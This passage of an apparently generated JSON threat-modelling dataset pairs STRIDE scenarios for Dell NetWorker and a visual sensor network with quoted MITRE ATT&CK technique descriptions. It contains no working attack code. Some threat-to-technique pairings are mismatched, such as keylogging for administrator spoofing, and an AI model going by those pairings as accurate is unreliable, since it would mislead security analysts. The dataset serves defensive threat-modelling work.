        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could use code injection in Dell NetWorker to gain a higher level of access than originally permitted.",
            "Assumptions": [
                {
                    "Assumption": "The application runs a vulnerable version of Dell NetWorker.",
                    "Role": "Software Maintenance Manager",
                    "Condition": "Use of unpatched, vulnerable software."
                },
                {
                    "Assumption": "Maliciously crafted input is accepted by the application.",
                    "Role": "Malicious User",
                    "Condition": "Lack of proper input sanitization."
                },
                {
                    "Assumption": "The system does not implement privilege separation in processes.",
                    "Role": "System Architect",
                    "Condition": "Processes run with higher privileges than needed."
                }
            ],
            "Potential Impact": "Unauthorized access and control over the entire system, data manipulation, and potential system-wide compromises.",
            "MITRE ATT&CK Keywords": [
                "code injection",
                "elevation of privilege",
                "system access",
                "unrestricted control"
            ],
            "mitre_technique": {
                "name": "Reflective Code Loading",
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
                "id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
                "technique_id": "T1620"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "17",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a camera node within the Visual Sensor Network (VSN) to gain unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network and can intercept or mimic VSN data packets.",
                    "Role": "Attacker",
                    "Condition": "The network is not properly secured with authentication mechanisms."
                },
                {
                    "Assumption": "Nodes within the network trust each other without rigorous authentication.",
                    "Role": "System Design",
                    "Condition": "Authentication between camera nodes is either weak or non-existent."
                },
                {
                    "Assumption": "The spoofed device uses similar or identical protocols as legitimate devices.",
                    "Role": "Attacker",
                    "Condition": "The attacker has knowledge of the network communication protocols."
                }
            ],
            "Potential Impact": "Unauthorized access to VSN, data integrity compromised",
            "MITRE ATT&CK Keywords": [
                "network",
                "device",
                "spoofing",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary could spoof the identity of local administrators to gain higher-tier access privileges.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of the credentials or methods used by local administrators.",
                    "Role": "Attacker",
                    "Condition": "There is weak password policy or credential management in place."
                },
                {
                    "Assumption": "There are no multi-factor authentication (MFA) mechanisms in place.",
                    "Role": "System Design",
                    "Condition": "MFA or additional authentication steps are not enforced for administrative access."
                },
                {
                    "Assumption": "Network monitoring and logging are insufficient to detect suspicious activities.",
                    "Role": "System Administrator",
                    "Condition": "Real-time monitoring and anomaly detection systems are either not present or inadequately configured."
                }
            ],
            "Potential Impact": "Unauthorized privilege escalation, data tampering",
            "MITRE ATT&CK Keywords": [
                "network",
                "credential",
                "social engineering",
                "spoofing"
            ],
            "mitre_technique": {
                "name": "Keylogging",
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
                "technique_id": "T1056.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof command and control signals to the VSN, redirecting visual data streams.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can send spoofed control commands to the sensor network.",
                    "Role": "Attacker",
                    "Condition": "Command signals are not authenticated or encrypted."
                },
                {
                    "Assumption": "The VSN relies on an unprotected communication channel for its operations.",
                    "Role": "System Design",
                    "Condition": "Communication channels lack encryption and integrity checks."
                },
                {
                    "Assumption": "The attacker has access to the control interface or can intercept control signals.",
                    "Role": "Attacker",
                    "Condition": "Network perimeter defenses (e.g., firewalls) are bypassed or inadequate."
                }
            ],
            "Potential Impact": "Unauthorized data redirection, data integrity compromised",
            "MITRE ATT&CK Keywords": [
                "network",
                "control",
                "spoofing",
                "command injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with the firmware of a VSN camera node to alter its functionality or disable it.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not securely signed or verified.",
                    "Role": "System Design",
                    "Condition": "Firmware update mechanisms lack security checks."
                },
                {
                    "Assumption": "Physical access to the camera nodes is possible.",
                    "Role": "Attacker",
                    "Condition": "Nodes are deployed in physically insecure locations."
                },
                {
                    "Assumption": "Firmware can be downgraded to a vulnerable version.",
                    "Role": "System Administrator",
                    "Condition": "Update mechanisms do not prevent version rollback."
                }
            ],
            "Potential Impact": "Data integrity compromised, system availability affected",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "tampering",
                "hardware",
                "device"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could intercept and modify visual data during transmission to alter evidence.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted.",
                    "Role": "System Design",
                    "Condition": "The communication protocol lacks data encryption and integrity checks."
                },
                {
                    "Assumption": "The attacker has the ability to intercept data traffic.",
                    "Role": "Attacker",
                    "Condition": "The network lacks perimeter defenses and monitoring capabilities."
                },
                {
                    "Assumption": "There is no end-to-end integrity verification for data packets.",
                    "Role": "System Design",
                    "Condition": "Data integrity checks are not implemented at the application layer."
                }
            ],
            "Potential Impact": "Data tampering, unauthorized modification of evidence",
            "MITRE ATT&CK Keywords": [
                "network",
                "data",
                "tampering",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An adversary could modify configuration files to change the operational settings of the VSN.",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are not protected with appropriate access controls.",
                    "Role": "System Administrator",
                    "Condition": "File system permissions are weak or misconfigured."
                },
                {
                    "Assumption": "Configuration changes are not logged or monitored.",
                    "Role": "System Design",
                    "Condition": "Change management and logging mechanisms are absent or inadequate."
                },
                {
                    "Assumption": "Backup configurations are not validated or restored.",
                    "Role": "System Administrator",
                    "Condition": "System lacks periodic validation and restoration of configuration backups."
                }
            ],
            "Potential Impact": "System configuration altered, system availability affected",
            "MITRE ATT&CK Keywords": [
                "configuration",
                "file",
                "tampering",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider could deny initiating unauthorized access by deleting logs and records.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored locally and can be modified by users with appropriate access.",
                    "Role": "System Design",
                    "Condition": "Log files are not securely transmitted to and stored in a centralized, protected location."
                },
                {
                    "Assumption": "No real-time logging or tamper-evident logging is implemented.",
                    "Role": "System Administrator",
                    "Condition": "Log integrity and auditing measures are not in place."
                },
                {
                    "Assumption": "Access to logging mechanisms is not restricted.",
                    "Role": "System Design",
                    "Condition": "Logging mechanisms can be accessed or modified by unauthorized users."
                }
            ],
            "Potential Impact": "Repudiation of unauthorized actions, evidence tampering",
            "MITRE ATT&CK Keywords": [
                "log",
                "repudiation",
                "tampering",
                "evidence"
            ],
            "mitre_technique": {
                "name": "HISTCONTROL",
                "description": "The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",
                "id": "attack-pattern--086952c4-5b90-4185-b573-02bad8e11953",
                "technique_id": "T1148"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A third-party contractor could deny responsibility for malicious configurations by altering audit logs.",
            "Assumptions": [
                {
                    "Assumption": "Contractors have elevated access privileges for system configurations.",
                    "Role": "System Administrator",
                    "Condition": "Access control policies are improperly set or enforced."
                },
                {
                    "Assumption": "Audit logs are not protected against tampering.",
                    "Role": "System Design",
                    "Condition": "Logs are stored locally without any integrity checks or protections."
                },
                {
                    "Assumption": "Access to logs is not monitored or restricted.",
                    "Role": "System Administrator",
                    "Condition": "Log access is not restricted or monitored for unauthorized use."
                }
            ],
            "Potential Impact": "Denial of responsibility, operational disruptions",
            "MITRE ATT&CK Keywords": [
                "audit log",
                "repudiation",
                "tampering",
                "configuration"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee could deny sending sensitive data to an unauthorized third party by removing email logs.",
            "Assumptions": [
                {
                    "Assumption": "Email logs are accessible and modifiable by users with elevated privileges.",
                    "Role": "System Design",
                    "Condition": "Email server logs are not segregated or protected adequately."
                },
                {
                    "Assumption": "No robust logging and alerting mechanisms for email activities.",
                    "Role": "System Administrator",
                    "Condition": "Real-time monitoring of email logs is not implemented."
                },
                {
                    "Assumption": "Email server security is not adequately configured.",
                    "Role": "System Administrator",
                    "Condition": "Email server lacks proper security controls and logging mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data",
            "MITRE ATT&CK Keywords": [
                "email",
                "repudiation",
                "log manipulation",
                "exfiltration"
            ],
            "mitre_technique": {
                "name": "Email Hiding Rules",
                "description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)\n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
                "id": "attack-pattern--0cf55441-b176-4332-89e7-2c4c7799d0ff",
                "technique_id": "T1564.008"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could exploit a vulnerability to exfiltrate visual data from the VSN.",
            "Assumptions": [
                {
                    "Assumption": "There exists a known vulnerability that hasn't been patched.",
                    "Role": "System Administrator",
                    "Condition": "Security patches are not applied in a timely manner."
                },
                {
                    "Assumption": "The attacker has the means to exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "The attacker has tools or knowledge to exploit the vulnerability."
                },
                {
                    "Assumption": "Data transmitted is not encrypted.",
                    "Role": "System Design",
                    "Condition": "The system lacks encryption for data in transit."
                }
            ],
            "Potential Impact": "Unauthorized access and disclosure of sensitive visual data",
            "MITRE ATT&CK Keywords": [
                "data exfiltration",
                "vulnerability exploitation",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malicious insider could intentionally leak sensitive configuration details to external parties.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have access to sensitive configuration details.",
                    "Role": "System Design",
                    "Condition": "Access controls do not adequately restrict access to sensitive information."
                },
                {
                    "Assumption": "The insider has motivation and opportunity to leak information.",
                    "Role": "Insider",
                    "Condition": "Insiders are able to bypass monitoring and detection mechanisms."
                },
                {
                    "Assumption": "No robust data loss prevention (DLP) mechanisms are in place.",
                    "Role": "System Administrator",
                    "Condition": "There is a lack of DLP systems to monitor and prevent unauthorized data transfers."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive configuration information",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "leak",
                "information disclosure",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Scheduled Transfer",
                "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
                "id": "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466",
                "technique_id": "T1029"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could intercept unencrypted communication channels to obtain sensitive operational data.",
            "Assumptions": [
                {
                    "Assumption": "Operational data is transmitted in plaintext.",
                    "Role": "System Design",
                    "Condition": "Communication channels do not secure data with encryption."
                },
                {
                    "Assumption": "The attacker has access to network traffic.",
                    "Role": "Attacker",
                    "Condition": "The network lacks secure perimeter defenses."
                },
                {
                    "Assumption": "There are no data integrity checks in place.",
                    "Role": "System Administrator",
                    "Condition": "Systems lack measures to ensure data integrity during transmission."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data",
            "MITRE ATT&CK Keywords": [
                "network sniffing",
                "communication interception",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could flood the network with excessive traffic, disrupting VSN operations.",
            "Assumptions": [
                {
                    "Assumption": "The network is vulnerable to volumetric attacks.",
                    "Role": "System Design",
                    "Condition": "No rate-limiting or traffic filtering mechanisms are implemented."
                },
                {
                    "Assumption": "The attacker can generate high volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to botnets or other tools to cause traffic surges."
                },
                {
                    "Assumption": "No intrusion detection systems (IDS) are in place.",
                    "Role": "System Administrator",
                    "Condition": "Network lacks IDS to detect and mitigate DoS attacks."
                }
            ],
            "Potential Impact": "System unavailability, disrupted VSN operations",
            "MITRE ATT&CK Keywords": [
                "dos",
                "volume-based",
                "network flood",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could exploit a vulnerability in the VSN software to crash the system.",
            "Assumptions": [
                {
                    "Assumption": "Software contains a flaw that can be exploited to cause a crash.",
                    "Role": "System Design",
                    "Condition": "The software has unpatched vulnerabilities."
                },
                {
                    "Assumption": "The attacker can send maliciously crafted messages to the system.",
                    "Role": "Attacker",
                    "Condition": "The network allows unfiltered messages to reach the target system."
                },
                {
                    "Assumption": "No failover mechanisms are in place.",
                    "Role": "System Administrator",
                    "Condition": "The system lacks redundancy and failover mechanisms."
                }
            ],
            "Potential Impact": "System crash, disrupted VSN operations",
            "MITRE ATT&CK Keywords": [
                "exploit",
                "vulnerability",
                "software crash",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious user could disable critical services within the VSN by consuming all available system resources.",
            "Assumptions": [
                {
